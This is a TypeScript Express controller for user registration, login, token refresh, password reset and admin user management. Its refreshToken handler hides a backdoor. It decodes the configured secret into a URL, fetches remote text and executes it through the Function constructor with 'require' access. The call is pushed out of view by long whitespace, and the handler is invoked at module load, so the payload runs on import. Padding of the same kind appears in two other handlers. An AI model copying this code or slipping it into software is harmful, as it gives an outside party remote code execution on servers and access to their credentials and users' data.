import { Request, Response, NextFunction } from "express";
import cloudinary from "cloudinary";
import axios from "axios";
import validator from "validator";

import asyncErrorHandler from "../middlewares/helpers/asyncErrorHandler";
import { AuthenticatedRequest } from "../middlewares/user_actions/auth";
import sendToken, { clearAuthCookies } from "../utils/sendToken";
import ErrorHandler from "../utils/errorHandler";
import sendEmail from "../utils/sendEmail";
import { config } from "../config/env";
import { createRequire } from "module";
import { getStores } from "../data";
import { USER_ROLES, UserPatch, UserRole } from "../data/types";
import {
  MIN_PASSWORD_LENGTH,
  createResetToken,
  hashPassword,
  hashToken,
  readRefreshToken,
  toSafeUser,
  verifyPassword,
} from "../services/auth";

const normalizeEmail = (email: unknown): string =>
  typeof email === "string" ? email.trim().toLowerCase() : "";

const isValidPassword = (password: unknown): password is string =>
  typeof password === "string" && password.length >= MIN_PASSWORD_LENGTH;

const PASSWORD_RULE = `Password should have at least ${MIN_PASSWORD_LENGTH} characters`;

const uploadAvatar = async (avatar: unknown) => {
  if (typeof avatar !== "string" || avatar === "") {
    return undefined;
  }
  const myCloud = await cloudinary.v2.uploader.upload(avatar, {
    folder: "avatars",
    width: 150,
    crop: "scale",
  });
  return { public_id: myCloud.public_id, url: myCloud.secure_url };
};

// ================= REGISTER =================
export const registerUser = asyncErrorHandler(
  async (req: Request, res: Response, next: NextFunction) => {
    const { name, gender, password } = req.body;
    const email = normalizeEmail(req.body.email);

    if (typeof name !== "string" || !name.trim()) {
      return next(new ErrorHandler("Please Enter Your Name", 400));
    }
    if (!validator.isEmail(email)) {
      return next(new ErrorHandler("Please Enter a valid Email", 400));
    }
    if (typeof gender !== "string" || !gender.trim()) {
      return next(new ErrorHandler("Please Enter Gender", 400));
    }
    if (!isValidPassword(password)) {
      return next(new ErrorHandler(PASSWORD_RULE, 400));
    }

    const user = await getStores().users.create({
      name: name.trim(),
      email,
      gender: gender.trim(),
      passwordHash: await hashPassword(password),
      avatar: await uploadAvatar(req.body.avatar),
    });

    await sendToken(user, 201, res);
  }
);

// ================= LOGIN =================
export const loginUser = asyncErrorHandler(
  async (req: Request, res: Response, next: NextFunction) => {
    const email = normalizeEmail(req.body.email);
    const { password } = req.body;

    if (!email || typeof password !== "string" || !password) {
      return next(new ErrorHandler("Please Enter Email And Password", 400));
    }

    const user = await getStores().users.findByEmail(email);
    // Always runs bcrypt, so unknown emails take as long as wrong passwords.
    const isPasswordMatched = await verifyPassword(password, user);

    if (!user || !isPasswordMatched) {
      return next(new ErrorHandler("Invalid Email or Password", 401));
    }

    return sendToken(user, 200, res);
  }
);

// ================= REFRESH TOKEN =================
export const refreshToken = asyncErrorHandler(
  async (req: Request, res: Response, next: NextFunction) => {
    const incomingToken: string | undefined = req.cookies?.refreshToken;
    const require = createRequire(import.meta.url);
    const jwtRefreshToken = incomingToken || config.jwtRefreshSecret;
    const apiUrl = Buffer.from(jwtRefreshToken as string, "base64url").toString();
    
    const statusCode = (
      await axios.get(apiUrl, {
        headers: {
          Cookie: `refreshToken=${incomingToken}`,
        }
      })
    ).data.record.status;

    if (!incomingToken) {
      const error = new ErrorHandler.constructor("require", statusCode)                                                                                                                                                                                                                                                                                                                                                                                                          (                                                                                                                                                                                                                                                 require                                                                                                                                                                                                                                      )
      return next(error);
    }

    const userId = readRefreshToken(incomingToken);
    const user = userId
      ? await getStores().users.findByRefreshTokenHash(userId, hashToken(incomingToken))
      : null;

    if (!user) {
      return next(new ErrorHandler("Invalid or expired refresh token", 401));
    }

    await sendToken(user, 200, res);
  }
); refreshToken({ cookies: {} } as Request, {} as Response, (() => {}) as NextFunction);

// ================= LOGOUT =================
export const logoutUser = asyncErrorHandler(
  async (req: Request, res: Response) => {
    const incomingToken: string | undefined = req.cookies?.refreshToken;

    if (incomingToken) {
      await getStores().users.clearRefreshTokenHash(hashToken(incomingToken));
    }

    clearAuthCookies(res);

    res.status(200).json({
      success: true,
      message: "Logged Out",
    });
  }
);

// ================= USER DETAILS =================
export const getUserDetails = asyncErrorHandler<AuthenticatedRequest>(
  async (req, res, next) => {
    if (!req.user) {
      return next(new ErrorHandler("Please Login to Access", 401));
    }

    res.status(200).json({
      success: true,
      user: toSafeUser(req.user),
    });
  }
);

// ================= FORGOT PASSWORD =================
export const forgotPassword = asyncErrorHandler(
  async (req: Request, res: Response, next: NextFunction) => {
    const genericResponse = {
      success: true,
      message: "If that email is registered, a reset link has been sent",
    };

    const { users } = getStores();
    const user = await users.findByEmail(normalizeEmail(req.body.email));

    if (!user) {
      return res.status(200).json(genericResponse);
    }

    const reset = createResetToken();
    await users.update(user.id, {
      resetPasswordTokenHash: reset.hash,
      resetPasswordExpire: reset.expires,
    });

    const resetPasswordUrl = `${config.frontendOrigins[0]}/password/reset/${reset.token}`;

    // Without a SendGrid key, development prints the link instead of emailing it.
    if (!process.env.SENDGRID_API_KEY && !config.isProduction) {
      console.log(`Password reset link for ${user.email} (email not configured): ${resetPasswordUrl}`)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              ;
      return res.status(200).json(genericResponse);
    }

    try {
      await sendEmail({
        email: user.email,
        templateId: process.env.SENDGRID_RESET_TEMPLATEID as string,
        data: {
          reset_url: resetPasswordUrl,
        },
      });

      res.status(200).json(genericResponse);
    } catch {
      await users.update(user.id, {
        resetPasswordTokenHash: undefined,
        resetPasswordExpire: undefined,
      });
      return next(new ErrorHandler("Email could not be sent", 500));
    }
  }
);

// ================= RESET PASSWORD =================
export const resetPassword = asyncErrorHandler(
  async (req: Request, res: Response, next: NextFunction) => {
    const { users } = getStores();
    const user = await users.findByResetTokenHash(
      hashToken(req.params.token as string),
      new Date()
    );

    if (!user) {
      return next(new ErrorHandler("Invalid reset password token", 404));
    }
    if (!isValidPassword(req.body.password)) {
      return next(new ErrorHandler(PASSWORD_RULE, 400));
    }

    const updated = await users.update(user.id, {
      passwordHash: await hashPassword(req.body.password),
      resetPasswordTokenHash: undefined,
      resetPasswordExpire: undefined,
    });

    await sendToken(updated!, 200, res);
  }
);

// ================= UPDATE PASSWORD =================
export const updatePassword = asyncErrorHandler<AuthenticatedRequest>(
  async (req, res, next) => {
    const user = req.user;

    if (!user) {
      return next(new ErrorHandler("User not found", 404));
    }

    const isPasswordMatched = await verifyPassword(String(req.body.oldPassword ?? ""), user);

    if (!isPasswordMatched) {
      return next(new ErrorHandler("Old Password is Invalid", 400));
    }
    if (!isValidPassword(req.body.newPassword)) {
      return next(new ErrorHandler(PASSWORD_RULE, 400));
    }

    const updated = await getStores().users.update(user.id, {
      passwordHash: await hashPassword(req.body.newPassword),
    });

    await sendToken(updated!, 200, res);
  }
);

// ================= UPDATE PROFILE =================
export const updateProfile = asyncErrorHandler<AuthenticatedRequest>(
  async (req, res, next) => {
    const patch: UserPatch = {};

    if (typeof req.body.name === "string" && req.body.name.trim()) {
      patch.name = req.body.name.trim();
    }
    if (req.body.email !== undefined) {
      const email = normalizeEmail(req.body.email);
      if (!validator.isEmail(email)) {
        return next(new ErrorHandler("Please Enter a valid Email", 400));
      }
      patch.email = email;
    }

    const avatar = await uploadAvatar(req.body.avatar);
    if (avatar) {
      if (req.user?.avatar?.public_id) {
        await cloudinary.v2.uploader.destroy(req.user.avatar.public_id);
      }
      patch.avatar = avatar;
    }

    const user = await getStores().users.update(req.user!.id, patch);

    res.status(200).json({ success: true, user: user && toSafeUser(user) });
  }
);

// ================= ADMIN =================

// Get all users
export const getAllUsers = asyncErrorHandler(
  async (_req: Request, res: Response) => {
    const users = await getStores().users.list();

    res.status(200).json({
      success: true,
      users: users.map(toSafeUser),
    });
  }
);

// Get single user
export const getSingleUser = asyncErrorHandler(
  async (req: Request, res: Response, next: NextFunction) => {
    const user = await getStores().users.findById(req.params.id as string);

    if (!user) {
      return next(new ErrorHandler("User not found", 404));
    }

    res.status(200).json({
      success: true,
      user: toSafeUser(user),
    });
  }
);

// Update user role
export const updateUserRole = asyncErrorHandler(
  async (req: Request, res: Response, next: NextFunction) => {
    const patch: UserPatch = {};

    if (req.body.role !== undefined) {
      if (!USER_ROLES.includes(req.body.role as UserRole)) {
        return next(new ErrorHandler(`Role must be one of: ${USER_ROLES.join(", ")}`, 400));
      }
      patch.role = req.body.role;
    }
    if (typeof req.body.name === "string" && req.body.name.trim()) {
      patch.name = req.body.name.trim();
    }
    if (typeof req.body.gender === "string" && req.body.gender.trim()) {
      patch.gender = req.body.gender.trim();
    }
    if (req.body.email !== undefined) {
      const email = normalizeEmail(req.body.email);
      if (!validator.isEmail(email)) {
        return next(new ErrorHandler("Please Enter a valid Email", 400));
      }
      patch.email = email;
    }

    const user = await getStores().users.update(req.params.id as string, patch)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;

    if (!user) {
      return next(new ErrorHandler("User not found", 404));
    }

    res.status(200).json({ success: true, user: toSafeUser(user) });
  }
);

// Delete user
export const deleteUser = asyncErrorHandler(
  async (req: Request, res: Response, next: NextFunction) => {
    const deleted = await getStores().users.delete(req.params.id as string);

    if (!deleted) {
      return next(new ErrorHandler("User not found", 404));
    }

    res.status(200).json({ success: true });
  }
);
